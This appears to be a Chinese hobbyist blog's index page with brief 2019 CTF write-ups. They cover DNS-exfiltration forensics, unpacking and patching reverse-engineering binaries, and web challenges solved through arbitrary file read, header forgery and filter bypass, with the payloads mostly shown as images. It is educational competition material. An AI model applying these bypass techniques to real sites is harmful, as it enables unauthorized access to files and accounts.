<h2 id="Kimi-No-Na-Wa"><a href="#Kimi-No-Na-Wa" class="headerlink" title="Kimi No Na Wa"></a><em><strong>Kimi No Na Wa</strong></em></h2><h3 id="Ps-这题是我最喜欢的一题-23333-，君名还是强的鸭"><a href="#Ps-这题是我最喜欢的一题-23333-，君名还是强的鸭" class="headerlink" title="_Ps:_这题是我最喜欢的一题_23333_，君名还是强的鸭~"></a><strong>_Ps:_这题是我最喜欢的一题_23333_，君名还是强的鸭~</strong></h3><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a><em><strong>0x01</strong></em></h2><h3 id="上来就给一堆又臭又长的题目介绍，其实真的去做了以后就会发现这玩意一点用没有"><a href="#上来就给一堆又臭又长的题目介绍，其实真的去做了以后就会发现这玩意一点用没有" class="headerlink" title="上来就给一堆又臭又长的题目介绍，其实真的去做了以后就会发现这玩意一点用没有"></a><strong>上来就给一堆又臭又长的题目介绍，其实真的去做了以后就会发现这玩意一点用没有</strong></h3><p><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504141551.png" alt=""></p>
<h3 id="打开后第一眼就被一堆-dns-晃晕了，可以看到有些奇怪的请求"><a href="#打开后第一眼就被一堆-dns-晃晕了，可以看到有些奇怪的请求" class="headerlink" title="打开后第一眼就被一堆_dns_晃晕了，可以看到有些奇怪的请求"></a><strong>打开后第一眼就被一堆_dns_晃晕了，可以看到有些奇怪的请求</strong></h3><p><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504142030.png" alt=""></p>
<h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a><em><strong>0x02</strong></em></h2><h3 id="过滤出dns-amp-amp-ip-src-192-168-196-133"><a href="#过滤出dns-amp-amp-ip-src-192-168-196-133" class="headerlink" title="过滤出dns&amp;&amp;ip.src ==192.168.196.133"></a><strong>过滤出<em>dns&amp;&amp;ip.src ==192.168.196.133</em></strong></h3><p><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504143212.png" alt=""></p>
<h3 id="再从这个请求中让它显示为单独的一组，-emmmm-，还有些别的东西在"><a href="#再从这个请求中让它显示为单独的一组，-emmmm-，还有些别的东西在" class="headerlink" title="再从这个请求中让它显示为单独的一组，_emmmm_，还有些别的东西在"></a><strong>再从这个请求中让它显示为单独的一组，_emmmm_，还有些别的东西在</strong></h3><p><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504143500.png" alt=""></p>
<h3 id="过滤一下，然后导出分析结果"><a href="#过滤一下，然后导出分析结果" class="headerlink" title="过滤一下，然后导出分析结果~"></a><strong>过滤一下，然后导出分析结果~</strong></h3><p><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504143732.png" alt=""></p>
<h2 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a><em><strong>0x03</strong></em></h2><h3 id="把数据提取出来然后-notepad-处理一下"><a href="#把数据提取出来然后-notepad-处理一下" class="headerlink" title="把数据提取出来然后_notepad++_处理一下"></a><strong>把数据提取出来然后_notepad++_处理一下</strong></h3><p><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504143858.png" alt=""></p>
<h3 id="base64-解码之后发现是《你的名字》小说英文版的最后一段，弃-flag-，读小说之"><a href="#base64-解码之后发现是《你的名字》小说英文版的最后一段，弃-flag-，读小说之" class="headerlink" title="_base64_解码之后发现是《你的名字》小说英文版的最后一段，弃_flag_，读小说之~"></a><strong>_base64_解码之后发现是《你的名字》小说英文版的最后一段，弃_flag_，读小说之~</strong></h3><h3 id="Ps：-强烈推荐君名实体小说，最好买台湾角川的，天闻角川的印刷质量总是令我不敢恭维"><a href="#Ps：-强烈推荐君名实体小说，最好买台湾角川的，天闻角川的印刷质量总是令我不敢恭维" class="headerlink" title="_Ps：_强烈推荐君名实体小说，最好买台湾角川的，天闻角川的印刷质量总是令我不敢恭维"></a><strong>_Ps：_强烈推荐君名实体小说，最好买台湾角川的，天闻角川的印刷质量总是令我不敢恭维</strong></h3><p><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504144325.png" alt=""></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/比赛/">比赛</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/24/ddctf-re2/"><span>DDCTF-RE2</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/24/ddctf-re2/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-24T13:13:20.000Z">
          2019-04-24
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a><em><strong>0x01</strong></em></h1><h3 id="查下壳，发现是aspack"><a href="#查下壳，发现是aspack" class="headerlink" title="查下壳，发现是aspack"></a><strong>查下壳，发现是<em>aspack</em></strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/9OG_Z@RLEU8REL23.png" alt=""></strong></p>
<h3 id="od-载入，-esp-脱壳"><a href="#od-载入，-esp-脱壳" class="headerlink" title="_od_载入，_esp_脱壳"></a><strong>_od_载入，_esp_脱壳</strong></h3><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a><em><strong>0x02</strong></em></h1><h3 id="载入-IDA-静态分析一波"><a href="#载入-IDA-静态分析一波" class="headerlink" title="载入_IDA_静态分析一波"></a><strong>载入_IDA_静态分析一波</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/YL@DRQ81B3VSYLDRW767.png" alt=""></strong></p>
<h3 id="主要逻辑还是很简单的，首先是对输入的一个check"><a href="#主要逻辑还是很简单的，首先是对输入的一个check" class="headerlink" title="主要逻辑还是很简单的，首先是对输入的一个check"></a><strong>主要逻辑还是很简单的，首先是对输入的一个<em>check</em></strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/IGN78GXDG0E3RU8G_A1G.png" alt=""></strong></p>
<h3 id="其实这段-check-倒是无所谓，-od-调试-nop-掉就得了，不过有可能可以从这里知道出题人希望我们输入的数据类型，明显是-16-进制字符串"><a href="#其实这段-check-倒是无所谓，-od-调试-nop-掉就得了，不过有可能可以从这里知道出题人希望我们输入的数据类型，明显是-16-进制字符串" class="headerlink" title="其实这段_check_倒是无所谓，_od_调试_nop_掉就得了，不过有可能可以从这里知道出题人希望我们输入的数据类型，明显是_16_进制字符串"></a><strong>其实这段_check_倒是无所谓，_od_调试_nop_掉就得了，不过有可能可以从这里知道出题人希望我们输入的数据类型，明显是_16_进制字符串</strong></h3><h3 id="而另一段。。。-emmm-嫌长不看了，不过可以从最后输出的结果来做到管中窥豹"><a href="#而另一段。。。-emmm-嫌长不看了，不过可以从最后输出的结果来做到管中窥豹" class="headerlink" title="而另一段。。。_emmm_嫌长不看了，不过可以从最后输出的结果来做到管中窥豹"></a><strong>而另一段。。。_emmm_嫌长不看了，不过可以从最后输出的结果来做到管中窥豹</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/85Z_ZYWF1U7FZIMA8U6YM.png" alt=""></strong></p>
<h3 id="解码结果"><a href="#解码结果" class="headerlink" title="解码结果"></a><strong>解码结果</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/5759895FNZPS6RMRDDFM.png" alt=""></strong></p>
<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a><em><strong>0x03</strong></em></h1><h3 id="再联系到上边的判断输入字符串是否与-”reverse-”-相等，不难想到-payload-如何构造"><a href="#再联系到上边的判断输入字符串是否与-”reverse-”-相等，不难想到-payload-如何构造" class="headerlink" title="再联系到上边的判断输入字符串是否与_”reverse+”_相等，不难想到_payload_如何构造"></a><strong>再联系到上边的判断输入字符串是否与_”reverse+”_相等，不难想到_payload_如何构造</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/asdasdads.jpg" alt=""></strong></p>
<h3 id="即-”ADEBDEAEC7BE”-，验证通过"><a href="#即-”ADEBDEAEC7BE”-，验证通过" class="headerlink" title="即_”ADEBDEAEC7BE”_，验证通过"></a><strong>即_”ADEBDEAEC7BE”_，验证通过</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/DS1OGALMHHLEUC8QE.png" alt=""></strong></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/re/">re</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/24/ddctf-web3/"><span>DDCTF-WEB3</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/24/ddctf-web3/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-24T11:43:12.000Z">
          2019-04-24
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a><strong>二次渲染</strong></h1><h1 id="参考文章：https-xz-aliyun-com-t-2657"><a href="#参考文章：https-xz-aliyun-com-t-2657" class="headerlink" title="参考文章：https://xz.aliyun.com/t/2657"></a><strong>参考文章：<em><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></em></strong></h1>
      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/web/">web</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/24/ddctf-re1/"><span>DDCTF-RE1</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/24/ddctf-re1/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-24T04:20:35.000Z">
          2019-04-24
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a><em><strong>0x01</strong></em></h1><h3 id="exeinfo-查壳发现是-upx-壳"><a href="#exeinfo-查壳发现是-upx-壳" class="headerlink" title="_exeinfo_查壳发现是_upx_壳"></a><strong>_exeinfo_查壳发现是_upx_壳</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/TPO@E3@926LSRC65BEF5.png" alt=""></strong></p>
<h3 id="直接一步到位手脱，单步几次达到oep"><a href="#直接一步到位手脱，单步几次达到oep" class="headerlink" title="直接一步到位手脱，单步几次达到oep"></a><strong>直接一步到位手脱，单步几次达到<em>oep</em></strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/3IYI7_HPSQV@NGI83HH.png" alt=""></strong> <strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/LWJ93G7PU7K4I@U44A.png" alt=""></strong></p>
<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a><em><strong>0x02</strong></em></h1><h3 id="手动修复-iat-，-import-rec-一哈"><a href="#手动修复-iat-，-import-rec-一哈" class="headerlink" title="手动修复_iat_，_import rec_一哈"></a><strong>手动修复_iat_，_import rec_一哈</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/IAKKV54_PZF16QF1J.png" alt=""></strong></p>
<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a><em><strong>0x03</strong></em></h1><h3 id="再用-ida-分析一下只要将传入字符串通过-check-是否等于-DDCTF-reverseME-即可，这里也不用写脚本，载入-od-，-nop-掉判断"><a href="#再用-ida-分析一下只要将传入字符串通过-check-是否等于-DDCTF-reverseME-即可，这里也不用写脚本，载入-od-，-nop-掉判断" class="headerlink" title="再用_ida_分析一下只要将传入字符串通过_check_是否等于_DDCTF{reverseME}_即可，这里也不用写脚本，载入_od_，_nop_掉判断"></a><strong>再用_ida_分析一下只要将传入字符串通过_check_是否等于_DDCTF{reverseME}_即可，这里也不用写脚本，载入_od_，_nop_掉判断</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/9LT789B5EO_RVFH8U.png" alt=""></strong></p>
<h3 id="直接搞定"><a href="#直接搞定" class="headerlink" title="直接搞定"></a><strong>直接搞定</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/GM9_OOOZCZ@YMQXVG.png" alt=""></strong></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/re/">re</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/19/ddctf-web2/"><span>DDCTF-WEB2</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/19/ddctf-web2/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-19T11:58:08.000Z">
          2019-04-19
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a><em><strong>0x01</strong></em></h1><h3 id="查看站点后发现需要进行认证-查看源代码后发现index-js-中的-hint"><a href="#查看站点后发现需要进行认证-查看源代码后发现index-js-中的-hint" class="headerlink" title="查看站点后发现需要进行认证,查看源代码后发现index.js_中的_hint"></a><strong>查看站点后发现需要进行认证,查看源代码后发现<em>index.js_中的_hint</em></strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/3ZE_2A6M1DX2O9BIBS.png" alt=""></strong> </p>
<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a><em><strong>0x02</strong></em></h1><h3 id="可以看出在请求头中添加didictf-username-字段-值经过猜测后确定为-admin"><a href="#可以看出在请求头中添加didictf-username-字段-值经过猜测后确定为-admin" class="headerlink" title="可以看出在请求头中添加didictf_username_字段,值经过猜测后确定为_admin"></a><strong>可以看出在请求头中添加<em>didictf_username_字段,值经过猜测后确定为_admin</em></strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/GL899CPF0GZHM@K9JLNHQ3.png" alt=""></strong></p>
<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a><em><strong>0x03</strong></em></h1><h3 id="在返回的-url-中发现两个源码"><a href="#在返回的-url-中发现两个源码" class="headerlink" title="在返回的_url_中发现两个源码"></a><strong>在返回的_url_中发现两个源码</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/7RY@Q8C9_KD9RP8.png" alt=""></strong></p>
<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a><em><strong>0x04</strong></em></h1><h3 id="直接贴-payload-吧，做出来之前感觉老麻烦，做完之后觉得没啥可分析的"><a href="#直接贴-payload-吧，做出来之前感觉老麻烦，做完之后觉得没啥可分析的" class="headerlink" title="直接贴_payload_吧，做出来之前感觉老麻烦，做完之后觉得没啥可分析的"></a><strong>直接贴_payload_吧，做出来之前感觉老麻烦，做完之后觉得没啥可分析的</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/P7QGGNSEG@IH@1NQ2.png" alt=""></strong></p>
<h3 id="key-值得到："><a href="#key-值得到：" class="headerlink" title="_key_值得到："></a><strong>_key_值得到：</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/Y5JU9ZCR__VW9EOP_AZN.png" alt=""></strong></p>
<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a><em><strong>0x05</strong></em></h1><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a><strong>构造<em>payload</em></strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/YKTYT06V@H8E3II7HT.png" alt=""></strong> <strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/ZDYE6JJ31YE1ZB94GRMU.png" alt=""></strong></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/web/">web</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/13/ddctf-web1/"><span>DDCTF-WEB1</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/13/ddctf-web1/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-12T18:11:31.000Z">
          2019-04-13
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a><strong><em>0x01</em></strong></h1><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/V4TB8MUA95VMNSQ8W.png" alt=""></strong></p>
<h3 id="发现传参-jpg-，值为一串-base64-编码后的的字符串，进行两次-base64-解码和一次-base16-解码后可以得到字符串“-flag-jpg-”。"><a href="#发现传参-jpg-，值为一串-base64-编码后的的字符串，进行两次-base64-解码和一次-base16-解码后可以得到字符串“-flag-jpg-”。" class="headerlink" title="发现传参_jpg_，值为一串_base64_编码后的的字符串，进行两次_base64_解码和一次_base16_解码后可以得到字符串“_flag.jpg_”。"></a><strong>发现传参_jpg_，值为一串_base64_编码后的的字符串，进行两次_base64_解码和一次_base16_解码后可以得到字符串“_flag.jpg_”。</strong></h3><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a><strong><em>0x02</em></strong></h1><h3 id="联系到上边的字符串，不难想到要点在于向-jpg-传入构造有效的-payload-来看到文件内容，首先尝试-index-php-，成功得到源码。"><a href="#联系到上边的字符串，不难想到要点在于向-jpg-传入构造有效的-payload-来看到文件内容，首先尝试-index-php-，成功得到源码。" class="headerlink" title="联系到上边的字符串，不难想到要点在于向_jpg_传入构造有效的_payload_来看到文件内容，首先尝试_index.php_，成功得到源码。"></a><strong>联系到上边的字符串，不难想到要点在于向_jpg_传入构造有效的_payload_来看到文件内容，首先尝试_index.php_，成功得到源码。</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/QBVBL47Y0R1HH6FY.png" alt=""></strong> <strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/M0WCPH43FZ6MAXVOPT.png" alt=""></strong></p>
<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a><strong><em>0x03</em></strong></h1><h3 id="访问-hint-地址发现屁用没有，从别的文章里发现了些有趣的东西。"><a href="#访问-hint-地址发现屁用没有，从别的文章里发现了些有趣的东西。" class="headerlink" title="访问_hint_地址发现屁用没有，从别的文章里发现了些有趣的东西。"></a><strong>访问_hint_地址发现屁用没有，从别的文章里发现了些有趣的东西。</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/7Q@_KO2O5EL6VHS.png" alt=""></strong> <strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/Q6LYG3Y0K8IBTWFVO.png" alt=""></strong></p>
<h3 id="尝试构造“-practice-txt-swp-”后得到-hint2-。"><a href="#尝试构造“-practice-txt-swp-”后得到-hint2-。" class="headerlink" title="尝试构造“_practice.txt.swp_”后得到_hint2_。"></a><strong>尝试构造“_practice.txt.swp_”后得到_hint2_。</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/W6JKKIWOEH@DXMH.png" alt=""></strong></p>
<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a><strong><em>0x04</em></strong></h1><h3 id="通过向jpg-传值的方式得到该文件源码，联系到-0x02-中的正则过滤掉字母数字以外的字符以及下边-str-替换“-config-”为“-”，可以构造“-f1agconfigddctf-php-”，得到-hint3-。"><a href="#通过向jpg-传值的方式得到该文件源码，联系到-0x02-中的正则过滤掉字母数字以外的字符以及下边-str-替换“-config-”为“-”，可以构造“-f1agconfigddctf-php-”，得到-hint3-。" class="headerlink" title="通过向jpg_传值的方式得到该文件源码，联系到_0x02_中的正则过滤掉字母数字以外的字符以及下边_str_替换“_config_”为“!_”，可以构造“_f1agconfigddctf.php_”，得到_hint3_。"></a><strong>通过向<em>jpg_传值的方式得到该文件源码，联系到_0x02_中的正则过滤掉字母数字以外的字符以及下边_str_替换“_config_”为“</em>!_”，可以构造“_f1agconfigddctf.php_”，得到_hint3_。</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/YQBN@H9421ACH6ZME.png" alt=""></strong></p>
<h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a><strong><em>0x05</em></strong></h1><h3 id="再简单不过的审计，构造-uid-为空即可，秒杀。"><a href="#再简单不过的审计，构造-uid-为空即可，秒杀。" class="headerlink" title="再简单不过的审计，构造_uid_为空即可，秒杀。"></a><strong>再简单不过的审计，构造_uid_为空即可，秒杀。</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/04/DPBLQAV_OFXY8TV.png" alt=""></strong></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/web/">web</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/12/24/duoshou-for-2018/"><span>2018年的剁手大全~</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/12/24/duoshou-for-2018/" rel="bookmark">
        <time class="entry-date published" datetime="2018-12-24T15:28:20.000Z">
          2018-12-24
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="1、akko-ducky-one87-2018"><a href="#1、akko-ducky-one87-2018" class="headerlink" title="1、akko ducky one87 2018"></a><em><strong>1、akko ducky one87 2018</strong></em></h2><h2 id="2、sony-nw-a45hn"><a href="#2、sony-nw-a45hn" class="headerlink" title="2、sony nw-a45hn"></a><em><strong>2、sony nw-a45hn</strong></em></h2><h2 id="3、qdc海王星"><a href="#3、qdc海王星" class="headerlink" title="3、qdc海王星"></a><em><strong>3、qdc海王星</strong></em></h2><h2 id="4、wifipineapple"><a href="#4、wifipineapple" class="headerlink" title="4、wifipineapple"></a><em><strong>4、wifipineapple</strong></em></h2><h2 id="5、sony-rx100m1"><a href="#5、sony-rx100m1" class="headerlink" title="5、sony rx100m1"></a><em><strong>5、sony rx100m1</strong></em></h2><p><img src="https://highker.wiki/wp-content/uploads/2018/12/DSC00700.JPG" alt=""></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/随笔/">随笔</a>
    </span>
    

    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  
  <a href="/page/2/" class="pagination-next">Next</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2019 John Doe
    
  </p>
</footer>
    
  </div>
</div>
</body>
</html>